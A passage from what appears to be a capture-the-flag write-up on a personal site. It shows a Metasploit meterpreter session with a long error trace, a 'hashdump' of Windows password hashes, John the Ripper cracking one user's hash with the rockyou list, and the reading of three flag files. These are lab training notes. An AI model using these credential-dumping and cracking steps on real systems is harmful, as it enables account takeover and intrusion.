+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `xor_bytes&#39;
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:952:in `to_r&#39;
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:137:in `send_packet&#39;
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response&#39;
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request&#39;
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:654:in `migrate&#39;
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1254:in `cmd_migrate&#39;
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command&#39;
+<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command&#39;
+<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single&#39;
+<a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each&#39;
+<a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single&#39;
+<a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact&#39;
+<a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:157:in `run&#39;
+<a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact&#39;
+<a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a>        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact&#39;
+<a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a>        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact&#39;
+<a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a>        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `cmd_sessions&#39;
+<a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command&#39;
+<a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single&#39;
+<a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each&#39;
+<a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single&#39;
+<a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `run&#39;
+<a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a>        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start&#39;
+<a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a>        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start&#39;
+<a id="__codelineno-8-38" name="__codelineno-8-38" href="#__codelineno-8-38"></a>        from /usr/bin/msfconsole:23:in `&lt;main&gt;&#39;
+<a id="__codelineno-8-39" name="__codelineno-8-39" href="#__codelineno-8-39"></a>/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998: warning: Exception in finalizer #&lt;Proc:0x00007f099d178a10 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339&gt;
+<a id="__codelineno-8-40" name="__codelineno-8-40" href="#__codelineno-8-40"></a>/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize&#39;: can&#39;t be called from trap context (ThreadError)
+<a id="__codelineno-8-41" name="__codelineno-8-41" href="#__codelineno-8-41"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet&#39;
+<a id="__codelineno-8-42" name="__codelineno-8-42" href="#__codelineno-8-42"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response&#39;
+<a id="__codelineno-8-43" name="__codelineno-8-43" href="#__codelineno-8-43"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request&#39;
+<a id="__codelineno-8-44" name="__codelineno-8-44" href="#__codelineno-8-44"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:362:in `close&#39;
+<a id="__codelineno-8-45" name="__codelineno-8-45" href="#__codelineno-8-45"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339:in `block in finalize&#39;
+<a id="__codelineno-8-46" name="__codelineno-8-46" href="#__codelineno-8-46"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `chr&#39;
+<a id="__codelineno-8-47" name="__codelineno-8-47" href="#__codelineno-8-47"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `block in xor_bytes&#39;
+<a id="__codelineno-8-48" name="__codelineno-8-48" href="#__codelineno-8-48"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `each_byte&#39;
+<a id="__codelineno-8-49" name="__codelineno-8-49" href="#__codelineno-8-49"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `xor_bytes&#39;
+<a id="__codelineno-8-50" name="__codelineno-8-50" href="#__codelineno-8-50"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:952:in `to_r&#39;
+<a id="__codelineno-8-51" name="__codelineno-8-51" href="#__codelineno-8-51"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:137:in `send_packet&#39;
+<a id="__codelineno-8-52" name="__codelineno-8-52" href="#__codelineno-8-52"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response&#39;
+<a id="__codelineno-8-53" name="__codelineno-8-53" href="#__codelineno-8-53"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:293:in `load_library&#39;
+<a id="__codelineno-8-54" name="__codelineno-8-54" href="#__codelineno-8-54"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:378:in `use&#39;
+<a id="__codelineno-8-55" name="__codelineno-8-55" href="#__codelineno-8-55"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:705:in `block in migrate&#39;
+<a id="__codelineno-8-56" name="__codelineno-8-56" href="#__codelineno-8-56"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:704:in `each&#39;
+<a id="__codelineno-8-57" name="__codelineno-8-57" href="#__codelineno-8-57"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:704:in `migrate&#39;
+<a id="__codelineno-8-58" name="__codelineno-8-58" href="#__codelineno-8-58"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1254:in `cmd_migrate&#39;
+<a id="__codelineno-8-59" name="__codelineno-8-59" href="#__codelineno-8-59"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command&#39;
+<a id="__codelineno-8-60" name="__codelineno-8-60" href="#__codelineno-8-60"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command&#39;
+<a id="__codelineno-8-61" name="__codelineno-8-61" href="#__codelineno-8-61"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single&#39;
+<a id="__codelineno-8-62" name="__codelineno-8-62" href="#__codelineno-8-62"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each&#39;
+<a id="__codelineno-8-63" name="__codelineno-8-63" href="#__codelineno-8-63"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single&#39;
+<a id="__codelineno-8-64" name="__codelineno-8-64" href="#__codelineno-8-64"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact&#39;
+<a id="__codelineno-8-65" name="__codelineno-8-65" href="#__codelineno-8-65"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:157:in `run&#39;
+<a id="__codelineno-8-66" name="__codelineno-8-66" href="#__codelineno-8-66"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact&#39;
+<a id="__codelineno-8-67" name="__codelineno-8-67" href="#__codelineno-8-67"></a>        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact&#39;
+<a id="__codelineno-8-68" name="__codelineno-8-68" href="#__codelineno-8-68"></a>        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact&#39;
+<a id="__codelineno-8-69" name="__codelineno-8-69" href="#__codelineno-8-69"></a>        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `cmd_sessions&#39;
+<a id="__codelineno-8-70" name="__codelineno-8-70" href="#__codelineno-8-70"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command&#39;
+<a id="__codelineno-8-71" name="__codelineno-8-71" href="#__codelineno-8-71"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single&#39;
+<a id="__codelineno-8-72" name="__codelineno-8-72" href="#__codelineno-8-72"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each&#39;
+<a id="__codelineno-8-73" name="__codelineno-8-73" href="#__codelineno-8-73"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single&#39;
+<a id="__codelineno-8-74" name="__codelineno-8-74" href="#__codelineno-8-74"></a>        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `run&#39;
+<a id="__codelineno-8-75" name="__codelineno-8-75" href="#__codelineno-8-75"></a>        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start&#39;
+<a id="__codelineno-8-76" name="__codelineno-8-76" href="#__codelineno-8-76"></a>        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start&#39;
+<a id="__codelineno-8-77" name="__codelineno-8-77" href="#__codelineno-8-77"></a>        from /usr/bin/msfconsole:23:in `&lt;main&gt;&#39;
+<a id="__codelineno-8-78" name="__codelineno-8-78" href="#__codelineno-8-78"></a>[*] Migration completed successfully.
+<a id="__codelineno-8-79" name="__codelineno-8-79" href="#__codelineno-8-79"></a>meterpreter &gt; 
+</code></pre></div>
+<p>Let's dump the password hashes using command <code>hashdump</code> in meterpreter.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>meterpreter &gt; hashdump
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>meterpreter &gt;
+</code></pre></div>
+<p>We can use <code>John the Ripper</code> to crack the hash.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>echo &quot;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::&quot; &gt; hash2crack.txt
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  --format=NT hash2crack.txt
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Using default input encoding: UTF-8
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Warning: no OpenMP support for this hash type, consider --fork=4
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>alqfna22         (Jon)     
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>1g 0:00:00:03 DONE (2023-01-20 14:15) 0.3236g/s 3301Kp/s 3301Kc/s 3301KC/s alqueva1968..alpus
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>Use the &quot;--show --format=NT&quot; options to display all of the cracked passwords reliably
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>Session completed.
+</code></pre></div>
+<p>Credentials Found: <code>Jon:alqfna22</code></p>
+<h2 id="post-exploitation">Post-Exploitation<a class="headerlink" href="#post-exploitation" title="Permanent link">&para;</a></h2>
+<p>First flag is in <code>C:\</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>C:\&gt;dir  
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>dir
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a> Volume in drive C has no label.
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a> Volume Serial Number is E611-0B66
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a> Directory of C:\
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>03/17/2019  01:27 PM                24 flag1.txt
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>07/13/2009  09:20 PM    &lt;DIR&gt;          PerfLogs
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>04/12/2011  02:28 AM    &lt;DIR&gt;          Program Files
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>03/17/2019  04:28 PM    &lt;DIR&gt;          Program Files (x86)
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>12/12/2018  09:13 PM    &lt;DIR&gt;          Users
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>03/17/2019  04:36 PM    &lt;DIR&gt;          Windows
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>               1 File(s)             24 bytes
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>               5 Dir(s)  20,398,546,944 bytes free
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>C:\&gt;type flag1.txt
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>type flag1.txt
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>flag{access_the_machine}
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>C:\&gt;
+</code></pre></div>
+<p>Flag 2 is in the <code>C:\Windows\System32\config</code> folder.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>C:\Windows\System32\config&gt;dir
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>dir
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a> Volume in drive C has no label.
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a> Volume Serial Number is E611-0B66
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a> Directory of C:\Windows\System32\config
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>01/20/2023  01:42 PM    &lt;DIR&gt;          .
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>01/20/2023  01:42 PM    &lt;DIR&gt;          ..
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>12/12/2018  05:00 PM            28,672 BCD-Template
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>01/20/2023  01:51 PM        18,087,936 COMPONENTS
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>01/20/2023  03:17 PM           262,144 DEFAULT
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>03/17/2019  01:32 PM                34 flag2.txt
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>07/13/2009  08:34 PM    &lt;DIR&gt;          Journal
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>01/20/2023  02:11 PM    &lt;DIR&gt;          RegBack
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>03/17/2019  02:05 PM           262,144 SAM
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>01/20/2023  01:51 PM           262,144 SECURITY
+<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a>01/20/2023  03:17 PM        40,632,320 SOFTWARE
+<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a>01/20/2023  03:23 PM        12,582,912 SYSTEM
+<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a>11/20/2010  08:41 PM    &lt;DIR&gt;          systemprofile
+<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>12/12/2018  05:03 PM    &lt;DIR&gt;          TxR
+<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>               8 File(s)     72,118,306 bytes
+<a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a>               6 Dir(s)  20,398,546,944 bytes free
+<a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a>
+<a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>C:\Windows\System32\config&gt;type flag2.txt
+<a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a>type flag2.txt
+<a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a>flag{sam_database_elevated_access}
+<a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a>C:\Windows\System32\config&gt;
+</code></pre></div>
+<p>Flag 3 is in Documents folder for Jon.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>C:\Users\Jon\Documents&gt;dir
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>dir
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a> Volume in drive C has no label.
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a> Volume Serial Number is E611-0B66
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a> Directory of C:\Users\Jon\Documents
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>12/12/2018  09:49 PM    &lt;DIR&gt;          .
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>12/12/2018  09:49 PM    &lt;DIR&gt;          ..
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>03/17/2019  01:26 PM                37 flag3.txt
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>               1 File(s)             37 bytes
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>               2 Dir(s)  20,398,546,944 bytes free
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>C:\Users\Jon\Documents&gt;type flag3.txt
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>type flag3.txt
+<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>flag{admin_documents_can_be_valuable}
+<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>C:\Users\Jon\Documents&gt;
+</code></pre></div>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">November 27, 2024</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../basicpentesting/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Basic Pentesting">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Basic Pentesting
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../commandinjection/" class="md-footer__link md-footer__link--next" aria-label="Next: Command Injection">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Command Injection
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2024 Nouman Noor
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/nanoor" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://ca.linkedin.com/in/nouman-noor-60193727" target="_blank" rel="noopener" title="ca.linkedin.com" class="md-social__link">
